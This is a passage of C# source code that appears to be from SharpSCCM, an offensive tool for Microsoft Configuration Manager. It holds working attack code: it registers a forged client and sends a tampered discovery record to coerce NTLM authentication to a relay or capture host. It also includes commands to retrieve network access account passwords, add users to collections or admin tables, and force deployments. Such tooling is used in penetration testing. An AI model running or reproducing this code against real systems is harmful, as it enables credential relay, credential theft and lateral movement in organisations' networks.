            try
            {
                ObjectQuery objQuery = new ObjectQuery(query);
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, objQuery);
                Console.WriteLine("-----------------------------------");
                Console.WriteLine(objQuery);
                Console.WriteLine("-----------------------------------");
                foreach (ManagementObject queryObj in searcher.Get())
                {
                    foreach (PropertyData prop in queryObj.Properties)
                    {
                        Console.WriteLine("{0}: {1}", prop.Name, prop.Value);
                    }
                    Console.WriteLine("-----------------------------------");
                }
            }
            catch (ManagementException err)
            {
                Console.WriteLine("An error occurred while querying for WMI data: " + err.Message);
            }
        }

        static void GetClasses(ManagementScope scope)
        {
            string query = "SELECT * FROM meta_class";
            Console.WriteLine($"[+] Executing WQL query: {query}");
            ObjectQuery objQuery = new ObjectQuery(query);
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, objQuery);
            var classes = new List<string>();
            foreach (ManagementClass wmiClass in searcher.Get())
            {
                classes.Add(wmiClass["__CLASS"].ToString());
            }
            classes.Sort();
            Console.WriteLine(String.Join("\n", classes.ToArray()));
        }

        static void GetClassInstances(ManagementScope scope, string wmiClass, bool count = false, string[] properties = null, string whereCondition = null, string orderByColumn = null, bool dryRun = false, bool verbose = false)
        {
            try
            {
                string query = "";
                string propString = "";
                string whereClause = "";
                string orderByClause = "";

                if (verbose || count || properties == null)
                {
                    propString = "*";
                }
                else
                {
                    string[] keyPropertyNames = GetKeyPropertyNames(scope, wmiClass);
                    properties = keyPropertyNames.Union(properties).ToArray();
                    propString = string.Join(",", properties);
                }
                if (!string.IsNullOrEmpty(whereCondition))
                {
                    whereClause = $"WHERE {whereCondition}";
                }
                if (!string.IsNullOrEmpty(orderByColumn))
                {
                    orderByClause = $"ORDER BY {orderByColumn}";
                }
                if (count)
                {
                    query = $"SELECT COUNT({propString}) FROM {wmiClass} {whereClause}";
                }
                else
                {
                    query = $"SELECT {propString} FROM {wmiClass} {whereClause} {orderByClause}";
                }

                if (dryRun)
                {
                    Console.WriteLine($"[+] WQL query: {query}");
                }
                else
                {
                    Console.WriteLine($"[+] Executing WQL query: {query}");
                    ObjectQuery objQuery = new ObjectQuery(query);
                    ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, objQuery);
                    Console.WriteLine("-----------------------------------");
                    Console.WriteLine(wmiClass);
                    Console.WriteLine("-----------------------------------");
                    foreach (ManagementObject queryObj in searcher.Get())
                    {
                        // Get lazy properties unless we're just counting instances
                        if (!count)
                        {
                            queryObj.Get();
                        }
                        foreach (PropertyData prop in queryObj.Properties)
                        {
                            // Print default properties if none specified, named properties if specified, or all properties if verbose
                            if (properties == null || properties.Length == 0 || properties.Contains(prop.Name) || count || verbose)
                            {
                                if (prop.IsArray)
                                {
                                    // Test to see if we can display property values as strings, otherwise bail. Byte[] (e.g., Device.ObjectGUID) breaks things, Object[] (e.g., Collection.CollectionRules, Collection.RefreshSchedule) breaks things
                                    if (prop.Value is String[])
                                    {
                                        String[] nestedValues = (String[])(prop.Value);
                                        Console.WriteLine($"{prop.Name}: {string.Join(", ", nestedValues)}");
                                    }
                                    else if (prop.Value is int[])
                                    {
                                        int[] nestedValues = (int[])(prop.Value);
                                        string[] nestedValueStrings = nestedValues.Select(x => x.ToString()).ToArray();
                                        Console.WriteLine($"{prop.Name}: {string.Join(", ", nestedValueStrings)}");
                                    }
                                    else
                                    {
                                        string canConvertToString = prop.Value as string;
                                        if (canConvertToString != null)
                                        {
                                            Console.WriteLine($"{prop.Name}: {canConvertToString}");
                                        }
                                        else
                                        {
                                            Console.WriteLine($"{prop.Name}: Can't display {prop.Type.ToString()} as a String");
                                        }
                                    }
                                }
                                else
                                {
                                    Console.WriteLine("{0}: {1}", prop.Name, prop.Value);
                                }
                            }
                        }
                        Console.WriteLine("-----------------------------------");
                    }
                }
            }
            catch (ManagementException err)
            {
                Console.WriteLine("An error occurred while querying for WMI data: " + err.Message);
            }
        }

        static void GetClassProperties(ManagementObject classInstance, bool showValue = false)
        {
            foreach (PropertyData property in classInstance.Properties)
            {
                if (!showValue)
                {
                    Console.WriteLine($"{property.Name} ({property.Type})");
                }
                else
                {
                    Console.WriteLine($"{property.Name} ({property.Type}): {property.Value}");
                }
            }
        }

        // Troubleshoot queryObj.Get() exception due to key properties not present when querying class instances
        //https://stackoverflow.com/questions/49798851/how-to-get-methods-from-wmi
        static string[] GetKeyPropertyNames(ManagementScope sccmConnection, string className)
        {
            using (ManagementClass managementClass = new ManagementClass(sccmConnection, new ManagementPath(className), new ObjectGetOptions()))
            {
                return managementClass.Properties
                    .Cast<PropertyData>()
                    .Where(
                        property => property.Qualifiers
                            .Cast<QualifierData>()
                            .Any(qualifier => string.Equals(qualifier.Name, "Key", StringComparison.OrdinalIgnoreCase))
                    )
                    .Select(property => property.Name)
                    .ToArray();
            }
        }

        public static byte[] StringToByteArray(string hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        public static string ByteArrayToString(byte[] ba)
        {
            return BitConverter.ToString(ba).Replace("-", "");
        }

        // Messaging SDK Functions
        static MessageCertificateX509 GetEncryptionCertificate()
        {
            // Get encryption certificate used by the legitimate client
            MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101.2", false);
            return certificate;
        }

        static MessageCertificateX509 GetSigningCertificate()
        {
            // Get signing certificate used by the legitimate client
            MessageCertificateX509 certificate = MessageCertificateX509File.Find(StoreLocation.LocalMachine, "SMS", X509FindType.FindByApplicationPolicy, "1.3.6.1.4.1.311.101", false);
            return certificate;
        }

        static MessageCertificateX509Volatile CreateUserCertificate()
        {
            // Generate certificate for signing and encrypting messages
            RSA rsaKey = RSA.Create(2048);
            CertificateRequest certRequest = new CertificateRequest("CN=ConfigMgr Client", rsaKey, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            certRequest.CertificateExtensions.Add(new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.DataEncipherment, false));
            // Any extended key usage
            certRequest.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(new OidCollection { new Oid("1.3.6.1.4.1.311.101.2"), new Oid("1.3.6.1.4.1.311.101") }, true));
            X509Certificate2 certificate2 = certRequest.CreateSelfSigned(DateTimeOffset.Now, DateTimeOffset.Now.AddYears(1));
            certificate2.FriendlyName = "ConfigMgr Client Certificate";
            X509Certificate2 exportedCert = new X509Certificate2(certificate2.Export(X509ContentType.Pfx, string.Empty));
            MessageCertificateX509Volatile certificate = new MessageCertificateX509Volatile(exportedCert);
            return certificate;
        }

        static SmsClientId RegisterClient(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode)
        {
            // HTTP sender is used for sending messages to the MP
            HttpSender sender = new HttpSender();

            // Create a registration request
            ConfigMgrRegistrationRequest registrationRequest = new ConfigMgrRegistrationRequest();

            // Add our certificate for message signing
            registrationRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing);

            // Discover local properties for client registration request
            Console.WriteLine("[+] Discovering local properties for client registration request");
            registrationRequest.Discover();

            // Modify properties
            Console.WriteLine("[+] Modifying client registration request properties");
            registrationRequest.AgentIdentity = "CCMSetup.exe";
            if (!string.IsNullOrEmpty(target))
            {
                registrationRequest.ClientFqdn = target;
                registrationRequest.NetBiosName = target;
            }
            Console.WriteLine($"  ClientFqdn: {registrationRequest.ClientFqdn}"); // Original ClientFqdn derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName + <domain name>
            Console.WriteLine($"  NetBiosName: {registrationRequest.NetBiosName}"); // Original NetBiosName derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName
            registrationRequest.Settings.HostName = managementPoint;
            registrationRequest.Settings.Compression = MessageCompression.Zlib;
            registrationRequest.Settings.ReplyCompression = MessageCompression.Zlib;
            registrationRequest.SiteCode = siteCode;
            Console.WriteLine($"  SiteCode: {registrationRequest.SiteCode}");

            // Serialize message XML and display to user
            registrationRequest.SerializeMessageBody();
            Console.WriteLine($"\n[+] Registration Request Body:\n{System.Xml.Linq.XElement.Parse(registrationRequest.Body.ToString())}");

            // Register client and wait for a confirmation with the SMSID
            Console.WriteLine($"[+] Sending HTTP registration request to {registrationRequest.Settings.HostName}:{registrationRequest.Settings.HttpPort}");
            SmsClientId clientId = registrationRequest.RegisterClient(sender, TimeSpan.FromMinutes(5));
            Console.WriteLine($"[+] Received unique GUID for new device: {clientId.ToString()}");
            return clientId;
        }

        static void SendDDR(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, SmsClientId clientId)
        {
            // HTTP sender is used for sending messages to the MP
            HttpSender sender = new HttpSender();

            // Build a gratuitous heartbeat DDR to send inventory information for the newly created system to SCCM
            ConfigMgrDataDiscoveryRecordMessage ddrMessage = new ConfigMgrDataDiscoveryRecordMessage();

            // Add our certificate for message signing and encryption
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
            ddrMessage.AddCertificateToMessage(certificate, CertificatePurposes.Encryption);

            // Discover local properties for DDR inventory report
            Console.WriteLine("[+] Discovering local properties for DDR inventory report");
            ddrMessage.Discover(); // This is required to generate the inventory report XML

            // Modify properties
            Console.WriteLine("[+] Modifying DDR and inventory report properties");
            // Set the client GUID to the one registered for the new fake client
            ddrMessage.SmsId = new SmsClientId(clientId.ToString());
            string originalSourceHost = ddrMessage.Settings.SourceHost.ToString();
            // Set target to local machine if not provided in command line option
            if (string.IsNullOrEmpty(target))
            {
                target = originalSourceHost;
            }
            ddrMessage.Settings.SourceHost = target;
            ddrMessage.NetBiosName = target;
            ddrMessage.SiteCode = siteCode;
            ddrMessage.SerializeMessageBody(); // This is required to build the DDR XML and inventory report XML but must take place after all modifications to the DDR message body

            // Update inventory report header with new device information
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientId = new InventoryClientIdBase(clientId);
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.ClientInstalled = false;
            ddrMessage.InventoryReport.ReportHeader.Identification.Machine.NetBiosName = target;

            // Modify DDR XML
            string ddrBodyXml = ddrMessage.Body.ToString();
            XmlDocument ddrXmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            ddrXmlDoc.LoadXml("<root>" + ddrBodyXml + "</root>");
            XmlNode clientInstalled = ddrXmlDoc.SelectSingleNode("//ClientInstalled");
            clientInstalled.InnerText = "0";
            XmlNode modifiedDdrXml = ddrXmlDoc.SelectSingleNode("//root");
            ddrBodyXml = modifiedDdrXml.InnerXml;
            // Use reflection to modify read-only Body property
            typeof(MessageBody).GetProperty("Payload").SetValue(ddrMessage.Body, ddrBodyXml);

            // Modify inventory report XML
            string inventoryReportXml = ddrMessage.InventoryReport.ReportBody.RawXml;
            XmlDocument inventoryXmlDoc = new XmlDocument();
            // Add dummy root element to appease XmlDocument parser
            inventoryXmlDoc.LoadXml("<root>" + inventoryReportXml + "</root>");
            // Replace OperatingSystemVersion special attribute (a.k.a. PlatformID) with Windows Workstation to coerce client push installation
            XmlNode platformIdNode = inventoryXmlDoc.SelectSingleNode("//PlatformID");
            Console.WriteLine($"[+] Discovered PlatformID: {platformIdNode.InnerXml}");
            platformIdNode.InnerText = "Microsoft Windows NT Workstation 2010.0";
            Console.WriteLine($"[+] Modified PlatformID: {platformIdNode.InnerXml}");
            // Replace original FQDN with supplied one
            XmlNode fqdnNode = inventoryXmlDoc.SelectSingleNode("//FQDN");
            fqdnNode.InnerText = target;
            XmlNode modifiedXml = inventoryXmlDoc.SelectSingleNode("//root");
            inventoryReportXml = modifiedXml.InnerXml;
            // Replace original NetBIOS name with supplied name
            inventoryReportXml = inventoryReportXml.Replace(originalSourceHost, target);
            // Use reflection to modify read-only RawXml property
            typeof(InventoryReportBody).GetProperty("RawXml").SetValue(ddrMessage.InventoryReport.ReportBody, inventoryReportXml);

            // Display XML to user
            Console.WriteLine($"\n[+] DDR Body:\n{System.Xml.Linq.XElement.Parse(ddrBodyXml)}");
            Console.WriteLine($"\n[+] Inventory Report Body:\n{System.Xml.Linq.XElement.Parse("<root>" + ddrMessage.InventoryReport.ReportBody.RawXml + "</root>")}\n");

            // Assemble message and send
            ddrMessage.Settings.Compression = MessageCompression.Zlib;
            ddrMessage.Settings.ReplyCompression = MessageCompression.Zlib;
            ddrMessage.Settings.HostName = managementPoint;
            Console.WriteLine($"[+] Sending DDR from {ddrMessage.SmsId} to {ddrMessage.Settings.Endpoint} endpoint on {ddrMessage.Settings.HostName}:{ddrMessage.SiteCode} and requesting client installation on {target}");
            ddrMessage.SendMessage(sender);
        }

        static void Main(string[] args)
        {
            // Gather required arguments
            var rootCommand = new RootCommand("Interact with Microsoft Endpoint Configuration Manager");
            rootCommand.Add(new Argument<string>("server", "The FQDN or NetBIOS name of the Configuration Manager server to connect to"));
            rootCommand.Add(new Argument<string>("sitecode", "The site code of the Configuration Manager server (e.g., PS1)"));

            //
            // Subcommands
            //

            // add
            var addCommand = new Command("add", "A group of commands that add objects to other objects (e.g., add device to collection)");
            rootCommand.Add(addCommand);

            // add device-to-collection
            var addDeviceToCollection = new Command("device-to-collection", "Add a device to a collection for application deployment");
            addCommand.Add(addDeviceToCollection);
            addDeviceToCollection.Add(new Argument<string>("device-name", "The name of the device you would like to add to the specified collection"));
            addDeviceToCollection.Add(new Argument<string>("collection-name", "The name of the collection you would like to add the specified device to"));
            addDeviceToCollection.Handler = CommandHandler.Create(
                (string server, string sitecode, string deviceName, string collectionName) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    AddDeviceToCollection(sccmConnection, deviceName, collectionName);
                });

            // add user-to-collection
            var addUserToCollection = new Command("user-to-collection", "Add a user to a collection for application deployment");
            addCommand.Add(addUserToCollection);
            addUserToCollection.Add(new Argument<string>("user-name", "The domain and user name you would like to add to the specified collection (e.g., DOMAIN-SHORTNAME\\USERNAME)"));
            addUserToCollection.Add(new Argument<string>("collection-name", "The name of the collection you would like to add the specified user to"));
            addUserToCollection.Handler = CommandHandler.Create(
                (string server, string sitecode, string userName, string collectionName) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    AddUserToCollection(sccmConnection, userName, collectionName);
                });

            // add user-to-admins
            var addUserToAdmins = new Command("user-to-admins", "Add a user to the RBAC_Admins table to obtain Full Administrator access to ConfigMgr console and WMI objects. This command requires local Administrator privileges on the server running the site database.");
            addCommand.Add(addUserToAdmins);
            addUserToAdmins.Add(new Argument<string>("user-name", "The domain and user name you would like to grant Full Administrator privilege to (e.g., DOMAIN-SHORTNAME\\USERNAME)"));
            //addUserToAdmins.Handler = CommandHandler.Create(
            //    (string server, string sitecode, string userName) =>
            //    {
            //        var connection = Database.Connect(server, sitecode);
            //        Database.Query(connection, "SELECT * FROM RBAC_Admins");
            //    });

            // get 
            var getCommand = new Command("get", "A group of commands that query certain objects and display their contents");
            rootCommand.Add(getCommand);
            getCommand.AddGlobalOption(new Option<bool>(new[] { "--count", "-c" }, "Returns the number of rows that match the specified criteria"));
            getCommand.AddGlobalOption(new Option<bool>(new[] { "--dry-run", "-d" }, "Display the resulting WQL query but do not connect to the specified server and execute it"));
            getCommand.AddGlobalOption(new Option<string>(new[] { "--order-by", "-o" }, "An ORDER BY clause to set the order of data returned by the query (e.g., \"ResourceID DESC\"). Defaults to ascending (ASC) order."));
            getCommand.AddGlobalOption(new Option<string[]>(new[] { "--properties", "-p" }, "A space-separated list of properties to query (e.g., \"IsActive UniqueUserName\". Always includes key properties.") { Arity = ArgumentArity.OneOrMore });
            Option whereOption = new Option<string>(new[] { "--where", "-w" }, "A WHERE condition to narrow the scope of data returned by the query (e.g., \"Name='cave.johnson'\" or \"Name LIKE '%cave%'\")");
            whereOption.Name = "whereCondition";
            // Using reflection to alias the "where" option to "whereCondition"
            typeof(Option).GetMethod("RemoveAlias", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(whereOption, new object[] { whereOption.Name });
            getCommand.AddGlobalOption(whereOption);
            getCommand.AddGlobalOption(new Option<bool>(new[] { "--verbose", "-v" }, "Display all class properties and their values (default: false)"));

            // get application
            var getApplication = new Command("application", "Get information on applications");
            getCommand.Add(getApplication);
            getApplication.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in application names (returns all applications where the name contains the provided string"));
            getApplication.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, bool dryRun, string orderBy, string[] properties, string whereCondition, bool verbose, string name) =>
                {
                    if (!string.IsNullOrEmpty(name))
                    {
                        whereCondition = $"LocalizedDisplayName='{name}'";
                    }
                    if (properties.Length == 0 && !verbose)
                    {
                        properties = new[] { "CI_ID", "CI_UniqueID", "CreatedBy", "DateCreated", "ExecutionContext", "DateLastModified", "IsDeployed", "IsEnabled", "IsHidden", "LastModifiedBy", "LocalizedDisplayName", "NumberOfDevicesWithApp", "NumberOfDevicesWithFailure", "NumberOfUsersWithApp", "NumberOfUsersWithFailure", "SourceSite" };
                    }
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    GetClassInstances(sccmConnection, "SMS_Application", count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get classes
            var getClasses = new Command("classes", "Get information on remote WMI classes");
            getCommand.Add(getClasses);
            getClasses.Add(new Argument<string>("wmiPath", "The WMI path to query (e.g., \"root\\CCM\")"));
            getClasses.Handler = CommandHandler.Create(
                (string server, string wmiPath, bool count, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\" + wmiPath);
                    GetClasses(sccmConnection);
                });

            // get class-instances
            var getClassInstances = new Command("class-instances", "Get information on WMI class instances");
            getCommand.Add(getClassInstances);
            getClassInstances.Add(new Argument<string>("wmiClass", "The WMI class to query (e.g., \"SMS_R_System\")"));
            getClassInstances.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, string wmiClass, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    if (properties.Length == 0)
                    {
                        verbose = true;
                    }
                    GetClassInstances(sccmConnection, wmiClass, count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get class-properties
            var getClassProperties = new Command("class-properties", "Get all properties of a specified WMI class");
            getCommand.Add(getClassProperties);
            getClassProperties.Add(new Argument<string>("wmiClass", "The WMI class to query (e.g., \"SMS_R_System\")"));
            getClassProperties.Handler = CommandHandler.Create(
                (string server, string sitecode, string wmiClass) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    ManagementObject classInstance = new ManagementClass(sccmConnection, new ManagementPath(wmiClass), new ObjectGetOptions()).CreateInstance();
                    GetClassProperties(classInstance);
                });

            // get collection
            var getCollection = new Command("collection", "Get information on collections");
            getCommand.Add(getCollection);
            getCollection.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in collection names (returns all devices where the device name contains the provided string"));
            getCollection.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, bool dryRun, string orderBy, string[] properties, string whereCondition, bool verbose, string name) =>
                {
                    if (!string.IsNullOrEmpty(name))
                    {
                        whereCondition = "Name LIKE '%" + name + "%'";
                    }
                    if (properties.Length == 0 && !verbose)
                    {
                        properties = new[] { "CollectionID", "CollectionType", "IsBuiltIn", "LastMemberChangeTime", "LastRefreshTime", "LimitToCollectionName", "MemberClassName", "MemberCount", "Name" };
                    }
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    GetClassInstances(sccmConnection, "SMS_Collection", count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get collection-member
            var getCollectionMember = new Command("collection-member", "Get the members of a specified collection");
            getCommand.Add(getCollectionMember);
            getCollectionMember.Add(new Argument<string>("name", "A string to search for in collection names (returns all members of collections with names containing the provided string"));
            getCollectionMember.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose, string name) =>
                {
                    if (properties.Length == 0 && !verbose)
                    {
                        properties = new[] { "Collection", "CollectionID", "Domain", "IsActive", "IsAssigned", "IsClient", "Name", "SiteCode" };
                    }
                    if (count || !string.IsNullOrEmpty(orderBy))
                    {
                        Console.WriteLine("[!] Error: COUNT and ORDER BY don't seem to work when querying SMS_CollectionMember_a");
                    }
                    else
                    {
                        ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                        GetCollectionMember(sccmConnection, name, count, properties, orderBy, dryRun, verbose);
                    }
                });

            // get deployment
            var getDeployment = new Command("deployment", "Get information on deployments");
            getCommand.Add(getDeployment);
            getDeployment.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in deployment names (returns all deployments where the name contains the provided string"));
            getDeployment.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose, string name) =>
                {
                    if (!string.IsNullOrEmpty(name))
                    {
                        whereCondition = "AssignmentName LIKE '%" + name + "%'";
                    }
                    if (properties.Length == 0 && !verbose)
                    {
                        properties = new[] { "ApplicationName", "AssignedCI_UniqueID", "AssignedCIs", "AssignmentName", "CollectionName", "Enabled", "EnforcementDeadline", "LastModificationTime", "LastModifiedBy", "NotifyUser", "SourceSite", "TargetCollectionID", "UserUIExperience" };
                    }
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    GetClassInstances(sccmConnection, "SMS_ApplicationAssignment", count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get device
            var getDevice = new Command("device", "Get information on devices");
            getCommand.Add(getDevice);
            getDevice.Add(new Option<string>(new[] { "--last-user", "-u" }, "Get information on devices where a specific user was the last to log in (matches exact string provided). Note: This reflects the last user logon at the point in time the last heartbeat DDR and hardware inventory was sent to the management point and may not be accurate."));
            getDevice.Add(new Option<string>(new[] { "--name", "-n" }, "A string to search for in device names (returns all devices where the device name contains the provided string"));
            getDevice.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, bool dryRun, string orderBy, string[] properties, string whereCondition, bool verbose, string lastUser, string name) =>
                {
                    if (!string.IsNullOrEmpty(lastUser))
                    {
                        whereCondition = "LastLogonUserName='" + lastUser + "'";
                    }
                    else if (!string.IsNullOrEmpty(name))
                    {
                        whereCondition = "Name LIKE '%" + name + "%'";
                    }
                    if (properties.Length == 0 && !verbose)
                    {
                        properties = new[] { "Active", "ADSiteName", "Client", "DistinguishedName", "FullDomainName", "HardwareID", "IPAddresses", "IPSubnets", "IPv6Addresses", "IPv6Prefixes", "IsVirtualMachine", "LastLogontimeStamp", "LastLogonUserDomain", "LastLogonUserName", "MACAddresses", "Name", "NetbiosName", "Obsolete", "OperatingSystemNameandVersion", "PrimaryGroupID", "ResourceDomainORWorkgroup", "ResourceNames", "SID", "SMSInstalledSites", "SMSUniqueIdentifier", "SNMPCommunityName", "SystemContainerName", "SystemGroupName", "SystemOUName" };
                    }
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    GetClassInstances(sccmConnection, "SMS_R_System", count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get naa
            var getNetworkAccessAccounts = new Command("naa", "Get network access accounts and passwords from the server policy");
            getCommand.Add(getNetworkAccessAccounts);
            getNetworkAccessAccounts.Handler = CommandHandler.Create(
                (string server, string sitecode) =>
                {
                    GetNetworkAccessAccounts(server, sitecode);
                }
                );

            // get primary-user
            var getPrimaryUser = new Command("primary-user", "Get information on primary users set for devices");
            getCommand.Add(getPrimaryUser);
            getPrimaryUser.Add(new Option<string>(new[] { "--device", "-d" }, "A specific device to search for (returns the device matching the exact string provided)"));
            getPrimaryUser.Add(new Option<string>(new[] { "--user", "-u" }, "A specific user to search for (returns all devices where the primary user name contains the provided string)"));
            getPrimaryUser.Handler = CommandHandler.Create(
                (string server, string sitecode, bool count, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose, string device, string user) =>
                {
                    if (!string.IsNullOrEmpty(device))
                    {
                        whereCondition = "ResourceName='" + device + "'";
                    }
                    else if (!string.IsNullOrEmpty(user))
                    {
                        whereCondition = "UniqueUserName LIKE '%" + user + "%'";
                    }
                    if (properties.Length == 0)
                    {
                        verbose = true;
                    }
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    GetClassInstances(sccmConnection, "SMS_UserMachineRelationShip", count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // get site-push-settings
            var getSitePushSettings = new Command("site-push-settings", "Query the specified management point for automatic client push installation settings (requires Full Administrator access)");
            getCommand.Add(getSitePushSettings);
            getSitePushSettings.Handler = CommandHandler.Create(
                (string server, string sitecode) =>
                {
                    GetSitePushSettings(server, sitecode);
                });

            // invoke
            var invokeCommand = new Command("invoke", "A group of commands that execute actions on the server");
            rootCommand.Add(invokeCommand);

            // invoke client-push
            var invokeClientPush = new Command("client-push", "Coerce the server to authenticate to an arbitrary destination via NTLM (if enabled) by registering a new device and sending a heartbeat data discovery record (DDR) with the ClientInstalled flag set to false. This command does not require local Administrator privileges but must be run from a client device. This command can also be run as an SCCM Administrator with the '--as-admin' option to use built-in functionality to initiate client push installation rather than registering a new client device.");
            invokeCommand.Add(invokeClientPush);
            invokeClientPush.Add(new Option<bool>(new[] { "--as-admin", "-a" }, "Use this option if you are in a user context with Administrator privileges to manage SCCM."));
            invokeClientPush.Add(new Option<string>(new[] { "--target", "-t" }, "The NetBIOS name, IP address, or if WebClient is enabled on the site server, the IP address and port (e.g., 192.168.1.1@8080) of the relay/capture server. The server will attempt to authenticate to the ADMIN$ share on this target. If left blank, NTLM authentication attempts will be sent to the machine running SharpSCCM."));
            invokeClientPush.Handler = CommandHandler.Create(
                (string server, string sitecode, bool asAdmin, string target) =>
                {
                    if (!asAdmin)
                    {
                        MessageCertificateX509 certificate = CreateUserCertificate();
                        SmsClientId clientId = RegisterClient(certificate, target, server, sitecode);
                        SendDDR(certificate, target, server, sitecode, clientId);
                    }
                    else
                    {
                        GenerateCCR(server, sitecode, target);
                    }

                });

            // invoke query
            var invokeQuery = new Command("query", "Execute a given WQL query");
            invokeCommand.Add(invokeQuery);
            invokeQuery.Add(new Argument<string>("query", "The WQL query to execute"));
            invokeQuery.Handler = CommandHandler.Create(
                (string server, string sitecode, string query) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    InvokeQuery(sccmConnection, query);
                });

            // invoke update
            var invokeUpdate = new Command("update", "Force all members of a specified collection to check for updates and execute any new applications that are available");
            invokeCommand.Add(invokeUpdate);
            invokeUpdate.Add(new Argument<string>("collection", "The name of the collection to force to update"));
            invokeUpdate.Handler = CommandHandler.Create(
                (string server, string sitecode, string collection) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                    InvokeUpdate(sccmConnection, collection);
                });

            // local
            var localCommand = new Command("local", "A group of commands to interact with the local workstation/server");
            rootCommand.Add(localCommand);

            // local class-instances
            var localClassInstances = new Command("class-instances", "Get information on local WMI class instances");
            localCommand.Add(localClassInstances);
            localClassInstances.Add(new Argument<string>("wmiClass", "The WMI class to query (e.g., \"SMS_Authority\")"));
            localClassInstances.Handler = CommandHandler.Create(
                (bool count, string wmiClass, string[] properties, string whereCondition, string orderBy, bool dryRun, bool verbose) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
                    if (properties.Length == 0)
                    {
                        verbose = true;
                    }
                    GetClassInstances(sccmConnection, wmiClass, count, properties, whereCondition, orderBy, dryRun, verbose);
                });

            // local class-properties
            var localClassProperties = new Command("class-properties", "Get all properties of a specified WMI class");
            localCommand.Add(localClassProperties);
            localClassProperties.Add(new Argument<string>("wmiClass", "The WMI class to query (e.g., \"SMS_R_System\")"));
            localClassProperties.Handler = CommandHandler.Create(
                (string wmiClass) =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
                    ManagementObject classInstance = new ManagementClass(sccmConnection, new ManagementPath(wmiClass), new ObjectGetOptions()).CreateInstance();
                    GetClassProperties(classInstance);
                });

            // local clientinfo
            var getLocalClientInfo = new Command("clientinfo", "Get the primary Management Point and Site Code for the local host");
            localCommand.Add(getLocalClientInfo);
            getLocalClientInfo.Handler = CommandHandler.Create(
                new Action(() =>
                {
                    ManagementScope sccmConnection = NewSccmConnection("\\\\localhost\\root\\ccm");
                    GetClassInstances(sccmConnection, "CCM_InstalledComponent", false, new[] { "Version" }, "Name='SmsClient'");
                }));

            // local create-ccr
            var localCreateCCR = new Command("create-ccr", "Create a CCR that initiates client push installation to a specified target (requires local Administrator privileges on a management point, only works on ConfigMgr 2003 and 2007)");
            localCommand.Add(localCreateCCR);
            localCreateCCR.Add(new Argument<string>("target", "The NetBIOS name, IP address, or if WebClient is enabled on the site server, the IP address and port (e.g., 192.168.1.1@8080) of the relay/capture server. The server will attempt to authenticate to the ADMIN$ share on this target."));
            localCreateCCR.Handler = CommandHandler.Create(
                (string target) =>
                {
                    string[] lines = { "[NT Client Configuration Request]", $"Machine Name={target}" };
